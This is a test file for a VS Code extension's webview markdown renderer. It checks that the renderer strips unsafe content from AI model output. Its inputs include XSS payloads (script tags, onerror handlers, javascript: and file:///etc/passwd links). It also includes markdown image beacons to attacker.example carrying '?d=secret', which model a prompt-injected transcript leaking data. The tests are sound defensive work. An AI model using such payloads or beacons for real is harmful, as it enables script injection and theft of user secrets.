/**
 * @vitest-environment jsdom
 */

import { describe, expect, it } from 'vitest';
import DOMPurify from 'dompurify';
import { PURIFY_CONFIG } from '../webview/render';

function render(markdown: string): string {
  const html = window.agiRender?.(markdown);
  expect(html).toBeTypeOf('string');
  return html ?? '';
}

function parse(markdown: string): Document {
  return new DOMParser().parseFromString(render(markdown), 'text/html');
}

function sanitize(html: string): Document {
  return new DOMParser().parseFromString(
    DOMPurify.sanitize(html, PURIFY_CONFIG) as string,
    'text/html',
  );
}

describe('VSCODE-05 — sanitizeHtml (command: URI and javascript: stripping in webview)', () => {
  it('keeps the link text but strips a command: href the model asked the webview to render', () => {
    const anchor = parse('[open](command:agi-workforce.agentMode)').querySelector('a');

    expect(anchor?.textContent).toBe('open');
    expect(anchor?.hasAttribute('href')).toBe(false);
  });

  it('strips every non-http scheme the allowlist does not name', () => {
    for (const href of [
      'command:agi-workforce.agentMode',
      'vscode-resource://some/path',
      'vscode-webview://host/path',
    ]) {
      const anchor = parse(`[x](${href})`).querySelector('a');
      expect(anchor, href).not.toBeNull();
      expect(anchor?.hasAttribute('href'), href).toBe(false);
    }
  });

  it('never builds a link at all for javascript:, data:, vbscript: and file: URIs', () => {
    for (const scheme of [
      'javascript:alert(1)',
      'data:text/html,alert',
      'vbscript:msgbox',
      'file:///etc/passwd',
    ]) {
      const doc = parse(`[x](${scheme})`);
      expect(doc.querySelector('a'), scheme).toBeNull();
      expect(doc.body.textContent?.trim(), scheme).toBe(`[x](${scheme})`);
    }
  });

  it('keeps the schemes the allowlist does name', () => {
    expect(parse('[h](https://example.com/p)').querySelector('a')?.getAttribute('href')).toBe(
      'https://example.com/p',
    );
    expect(parse('[m](mailto:user@example.com)').querySelector('a')?.getAttribute('href')).toBe(
      'mailto:user@example.com',
    );
    expect(parse('see https://example.com/path now').querySelector('a')?.getAttribute('href')).toBe(
      'https://example.com/path',
    );
  });

  it('forces every surviving link to open outside the webview with no opener', () => {
    const anchor = parse('[h](https://example.com)').querySelector('a');

    expect(anchor?.getAttribute('target')).toBe('_blank');
    expect(anchor?.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('keeps code-block actions as buttons that cannot submit', () => {
    const buttons = parse('```ts\nconst x = 1;\n```').querySelectorAll('button');

    expect([...buttons].map((button) => button.getAttribute('type'))).toEqual(['button', 'button']);
  });

  it('escapes raw HTML in model output instead of rendering it', () => {
    for (const markdown of [
      'before <script>alert(1)</script> after',
      'x <img src=x onerror="alert(1)"> y',
      '<iframe src="https://evil.com"></iframe>',
      '<div onclick="alert(1)">click</div>',
    ]) {
      const doc = parse(markdown);
      expect(doc.querySelector('script, img, iframe, div'), markdown).toBeNull();
    }
  });

  it('drops markdown image syntax so a prompt-injected transcript cannot beacon out', () => {
    const doc = parse('![beacon](https://attacker.example/p.png?d=secret)');

    expect(doc.querySelector('img')).toBeNull();
    expect(doc.body.innerHTML).not.toContain('attacker.example');
  });

  it('drops a reference-style image and a linked image the same way', () => {
    const reference = parse('![b][ref]\n\n[ref]: https://attacker.example/r.png?d=secret');
    expect(reference.querySelector('img')).toBeNull();
    expect(reference.body.innerHTML).not.toContain('attacker.example');

    const linked = parse('[![b](https://attacker.example/i.png?d=secret)](https://example.com)');
    expect(linked.querySelector('img')).toBeNull();
    expect(linked.body.innerHTML).not.toContain('attacker.example');
  });

  it('drops every forbidden tag, including the six DOMPurify would otherwise keep', () => {
    for (const tag of [
      'img',
      'picture',
      'svg',
      'math',
      'audio',
      'video',
      'source',
      'form',
      'iframe',
      'object',
      'embed',
      'link',
      'meta',
      'base',
      'style',
      'script',
    ]) {
      expect(sanitize(`<${tag}></${tag}>`).querySelector(tag), tag).toBeNull();
    }
  });

  it('drops the forbidden attributes when HTML reaches the sanitizer directly', () => {
    const paragraph = sanitize('<p style="position:fixed;top:0" onclick="alert(1)">hi</p>');

    expect(paragraph.querySelector('p')?.hasAttribute('style')).toBe(false);
    expect(paragraph.querySelector('p')?.hasAttribute('onclick')).toBe(false);
    expect(paragraph.querySelector('p')?.textContent).toBe('hi');

    const button = sanitize('<button formaction="https://evil.com">go</button>');
    expect(button.querySelector('button')?.hasAttribute('formaction')).toBe(false);
  });

  it('refuses data attributes so nothing smuggles state into the webview DOM', () => {
    expect(
      sanitize('<p data-secret="x">y</p>').querySelector('p')?.hasAttribute('data-secret'),
    ).toBe(false);
  });
});
